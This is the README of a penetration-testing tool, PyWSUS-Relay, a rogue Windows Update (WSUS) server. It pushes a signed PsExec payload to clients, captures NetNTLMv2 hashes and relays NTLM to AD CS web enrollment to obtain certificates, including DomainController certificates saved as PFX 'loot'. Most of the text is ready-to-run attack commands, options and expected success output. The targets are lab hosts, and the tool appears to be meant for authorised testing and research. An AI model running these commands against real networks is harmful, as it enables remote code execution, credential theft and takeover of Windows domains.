# PyWSUS-Relay

Rogue WSUS-over-HTTP server that keeps Windows Update Agent (WUA) talking while serving controlled WSUS metadata and a Microsoft-signed payload.

This fork adds NTLM capture, basic HTTP relay, and AD CS `/certsrv/` validation/issuance.

## Install

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Use a Microsoft-signed PE payload, for example `PsExec64.exe`.

## Run

Normal WSUS mode:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' -v
```

NTLM capture:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode capture \
  --hash-file netntlm-captures.txt \
  --json-events wsus-events.jsonl \
  -v
```

HTTP relay:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://target.lab.local/protected/ \
  --relay-action auth-only \
  -v
```

AD CS Web Enrollment validation:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-certsrv \
  --relay-adcs-marker PYWSUS-LAB-ADCS \
  --json-events relay-adcs.jsonl \
  -v
```

AD CS certificate issuance:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template Machine \
  --adcs-loot-dir loot \
  -v
```

Domain controller certificate issuance:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://192.168.56.102/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template DomainController \
  --adcs-loot-dir loot \
  --json-events issue-adcs-dc.jsonl \
  -v
```

Successful signal:

```text
HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx
```

## Useful Options

```text
--ntlm-mode {off,challenge-only,capture,relay-http}
--relay-target URL
--relay-action {auth-only,adcs-certsrv,adcs-issue}
--relay-adcs-marker TEXT
--adcs-template NAME
--adcs-alt-name UPN
--adcs-loot-dir DIR
--ntlm-session-key {ip,connection}
--ntlm-protect-downloads
--hash-file FILE
--json-events FILE
--log-file FILE
-r HOURS
```

Interactive keys:

```text
q  quit
r  rotate session
```

## Expected Signals

Capture:

```text
NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
HashCapture NetNTLMv2 DOMAIN\HOST$ -> netntlm-captures.txt
GetConfig
```

AD CS relay validation:

```text
HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True
```

AD CS issuance:

```text
HTTP relay result ... adcs_issued=True cert_id=42 pfx=loot/DOMAIN_HOST_.pfx
```

## Notes

- Default NTLM session key is `ip`; use this for single-client WUA testing.
- Use `--ntlm-session-key connection` for stricter IP+source-port tracking.
- NetNTLMv2 output format: `user::domain:challenge:nt_proof:client_blob`.
- Generated state includes `data/known_clients.json`, `netntlm-captures.txt`, optional JSONL event logs, and optional PFX loot.
- `adcs-certsrv` probes `/certsrv/certrqxt.asp`; `adcs-issue` submits a CSR and saves a PFX.

## Credits

Original PyWSUS research/tooling by GoSecure, with prior proxy PoC research by Paul Stone and Alex Chapman. See the GoSecure WSUS attack blog series and MS-WUSP documentation for protocol background.
